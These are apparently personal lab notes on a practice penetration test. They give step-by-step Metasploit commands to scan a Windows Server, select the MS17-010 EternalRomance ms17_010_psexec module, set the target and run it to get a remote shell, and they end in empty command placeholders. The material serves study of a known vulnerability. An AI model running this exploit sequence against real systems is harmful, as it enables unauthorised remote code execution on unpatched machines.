First cmd 
searching for the eternalromance exploit in microsoft os

Order:

CMD:1 nmap -sV 10.129.2.141 
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


CMD:2 search eternalromance 

CMD:3 search eternalromance :exploit 
  #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

# You can also specify the search with type: rank: cve: etc 
# <type:auxiliary/exploit/post> formatted with arrow span <>

CMD:4 search ms17_010 
# what version is this Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

CMD:5 use 0 
# 1 or 0 or whatever explot on the list matches 
# 0 didnt work try the other exploits 

CMD:6 options

CMD:7 set RHOSTS 10.129.2.141 
# or setg for perm target  

CMD:8 run 
# execute the exploit

CMD:9 shell # run a active shell on the target machine
CMD:10
CMD:11
CMD:12
CMD:13
CMD:14
